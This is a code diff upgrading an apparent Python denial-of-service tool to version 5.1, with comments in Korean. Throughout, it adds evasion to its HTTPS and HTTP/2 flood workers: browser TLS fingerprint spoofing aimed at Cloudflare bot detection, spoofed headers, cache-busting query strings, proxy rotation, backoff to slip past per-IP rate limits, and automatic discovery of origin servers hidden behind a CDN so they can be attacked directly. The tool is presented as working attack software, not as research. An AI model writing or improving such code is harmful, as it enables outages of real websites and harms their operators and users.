@@ -277,7 +277,11 @@ def _load_proxy_pool(file_path):
                 # Add scheme if missing
                 if ':' in line and not line.startswith(('http://', 'https://', 'socks5://')):
                     line = 'http://' + line
-                proxies.append(line)
+                # v5.1: basic validation (host:port format)
+                if ':' in line.split('//')[-1] if '//' in line else ':' in line:
+                    proxies.append(line)
+                else:
+                    print(f"[proxy] skip invalid: {line}", file=sys.stderr)
     except Exception as e:
         print(f"[proxy] 파일 로드 실패: {e}", file=sys.stderr)
     return proxies
@@ -378,6 +382,43 @@ def _spoofed_http_req(host, path, profile='chrome'):
     head = f'GET {req_path} HTTP/1.1\r\n'
     body = head + '\r\n'.join(headers) + '\r\n\r\n'
     return body.encode()
+
+def _browser_ssl_context(profile='chrome', server_hostname=None):
+    """v5.1: 브라우저 TLS 지문을 흉내낸 SSL 컨텍스트 생성.
+    
+    Cloudflare는 TLS 핸드셰이크(cipher 순서, ALPN, extension)로 봇을 감지한다.
+    Python 기본 ssl은 cipher 순서가 Python 특이한데, 브라우저 순서로 재정의한다.
+    """
+    import ssl as _ssl
+    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
+    
+    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    
+    # 브라우저 cipher 순서 적용 (TLS 1.2 ciphers)
+    # TLS 1.3 ciphers는 순서 고정 (GCM only)라 TLS 1.2만 적용
+    cipher_list = ':'.join(f'{c:04X}' for c in p['ciphers'])
+    try:
+        ctx.set_ciphers(cipher_list)
+    except _ssl.SSLError:
+        pass  # 일부 cipher 미지원이면 기본 사용
+    
+    # ALPN (HTTP/2 우선)
+    try:
+        ctx.set_alpn_protocols(p['alpn'])
+    except (NotImplementedError, _ssl.SSLError):
+        pass
+    
+    # Session ticket (브라우저는 사용)
+    ctx.options |= _ssl.OP_ENABLE_MIDDLEBOX_COMPAT
+    
+    return ctx
+
+def _browser_ua(profile='chrome'):
+    """v5.1: 브라우저 User-Agent 반환."""
+    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
+    return p['ua']
 
 def _get_next_proxy():
     """다음 프록시 반환 (429 감지 시 자동 회전).
@@ -778,14 +819,21 @@ async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
     stats.conns += n_procs
 
 async def https_worker(name, url, stats, duration, stop, payload_size=0):
-    """HTTPS L7 공격 워커: TLS + HTTP 요청 폭주"""
+    """HTTPS L7 공격 워커: TLS + HTTP 요청 폭주 (v5.1: 브라우저 지문 스푸핑)"""
     host, port, path = parse_http(url)
-    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
+    # v5.1: 브라우저 TLS 지문 (cipher 순서 + ALPN)
+    ctx = _browser_ssl_context(_BROWSER[0], server_hostname=host)
     reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
-           f"User-Agent: dossal/{VERSION}\r\n\r\n")
+    # v5.1: 브라우저 HTTP 헤더 (Cache Bypass 포함)
+    import random as _rs2
+    import time as _t2
+    if _CACHE_BYPASS[0]:
+        salt = int(_t2.time() * 1000) + _rs2.randint(0, 99999)
+        req_path = f"{path}?_cb={salt}&r={_rs2.randint(100000, 999999)}"
+    else:
+        req_path = path
+    _h, _ = _spoofed_http_headers(host, req_path, _BROWSER[0])
+    req = (f"GET {req_path} HTTP/1.1\r\n" + "\r\n".join(_h) + "\r\n\r\n")
     req_bytes = req.encode()
     while not stop.is_set():
         if _JITTER[0] > 0:
@@ -1039,13 +1087,19 @@ async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.bytes += total * payload_size
 
 async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
-    """HTTP/2 (h2) 공격 워커: ALPN 협상 + H2 스트림 폭주"""
+    """HTTP/2 (h2) 공격 워커: ALPN 협상 + H2 스트림 폭주 (v5.1: 브라우저 TLS 지문)"""
     host, port, path = parse_http(url)
-    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_alpn_protocols(['h2'])
-    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
+    # v5.1: 브라우저 TLS cipher 순서 + ALPN h2
+    _h2_ctx = __import__('ssl').SSLContext(__import__('ssl').PROTOCOL_TLS_CLIENT)
+    _h2_ctx.check_hostname = False
+    _h2_ctx.verify_mode = __import__('ssl').CERT_NONE
+    _p = _BROWSER_PROFILES.get(_BROWSER[0], _BROWSER_PROFILES['chrome'])
+    try:
+        _h2_ctx.set_ciphers(':'.join(f'{c:04X}' for c in _p['ciphers']))
+    except Exception:
+        pass
+    _h2_ctx.set_alpn_protocols(['h2'])
+    reader, writer = await asyncio.open_connection(host, port, ssl=_h2_ctx)
     config = H2Configuration(client_side=True)
     conn = H2Connection(config=config)
     conn.initiate_connection()
@@ -1897,6 +1951,8 @@ def _mp_http_send(args_tuple):
     cur_ip = src_ip
     cur_proxy = proxy  # Current proxy (tuples: (host, port))
     proxy_idx = 0  # Proxy pool index
+    PROXY_ROTATE_EVERY = 50  # v5.1: 매 50개 요청마다 프록시 자동轮换
+    req_since_rotate = 0  # Since last rotate
     end = _time.time() + duration
     while _time.time() < end:
         # Connect (or reconnect after 429/error)
@@ -1956,9 +2012,22 @@ def _mp_http_send(args_tuple):
             if not data:
                 break
             sent += 1
+            # v5.1: 매 N개 요청마다 프록시 자동轮换 (keep-alive 구간에서도)
+            if proxy_pool and len(proxy_pool) > 0:
+                req_since_rotate += 1
+                if req_since_rotate >= PROXY_ROTATE_EVERY:
+                    req_since_rotate = 0
+                    proxy_idx += 1
+                    s.close()
+                    s = None
+                    continue
             # 429 detection: this IP/proxy is blocked, switch to next
             if _RECOVERY[0] and data[:12].startswith(b'HTTP/1.1 429'):
                 blocked += 1
+                # v5.1: burst + backoff - 429를 5개 연속 받으면 0.5초간 대기
+                # Cloudflare의 per-IP time-window rate limit 우회
+                if blocked % 5 == 0 and blocked > 0:
+                    _time.sleep(0.5)  # 500ms backoff
                 # Rotate IP if IP pool available
                 if ip_pool:
                     if cur_ip:
@@ -2849,6 +2918,8 @@ examples:
         help="캐시 우회: 랜덤 쿼리 파라미터로 CDN/캐시 캐싱 방지")
     ap.add_argument("--discover", action="store_true",
         help="Origin IP 탐지: DNS/SSL/Redirect 분석 후 CDN 뒤 실제 서버 IP 출력")
+    ap.add_argument("--no-auto-discover", action="store_true",
+        help="자동 Origin 탐지 비활성 (CDN 감지 시에도 자동 스캔 안 함)")
     ap.add_argument("--dry-run", action="store_true",
         help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
     args = ap.parse_args()
@@ -2904,6 +2975,34 @@ examples:
             if args.spoof == 0:
                 args.spoof = 100
             print("[SUPER] 최대 전력 + 스텔스 + 자동회복 + 100 스푸핑 IP + 2ms 지연", file=sys.stderr)
+    
+    # v5.1: 자동 Origin Discovery
+    # CDN IP만 있으면 자동으로 origin을 찾아 src-ips에 적용
+    if not args.discover and not args.dry_run and not args.no_auto_discover:
+        try:
+            from urllib.parse import urlparse as _up_auto
+            _host_auto = _up_auto(args.url).hostname or args.url
+            # First, check if target is behind CDN
+            import socket as _sock_auto
+            _addrs_auto = _sock_auto.getaddrinfo(_host_auto, None, _sock_auto.AF_INET, _sock_auto.SOCK_STREAM)
+            _cdn_count = sum(1 for a in _addrs_auto if _is_cdn_ip(a[4][0]))
+            _total = len(_addrs_auto)
+            if _total > 0 and _cdn_count == _total:
+                # All IPs are CDN → auto discover origin
+                print(f"[auto-discover] target behind CDN ({_cdn_count}/{_total} CDN IPs), scanning origin...", file=sys.stderr)
+                _origin, _details = _discover_origin(_host_auto)
+                if _origin:
+                    print(f"[auto-discover] ✅ origin found: {_origin}", file=sys.stderr)
+                    # Apply origin IPs as source IPs (if not already set)
+                    if not args.spoof and not args.pool and not getattr(args, 'src_ips', None):
+                        args.src_ips = ','.join(_origin)
+                        print(f"[auto-discover] setting --src-ips={args.src_ips}", file=sys.stderr)
+                    elif args.spoof:
+                        print(f"[auto-discover] tip: also try --src-ips={','.join(_origin)}", file=sys.stderr)
+                else:
+                    print(f"[auto-discover] ⚠️ no non-CDN origin found, attacking CDN edge", file=sys.stderr)
+        except Exception as _e:
+            print(f"[auto-discover] skipped: {_e}", file=sys.stderr)
     
     # Dry-run: probe and predict, don't attack
     if args.dry_run:
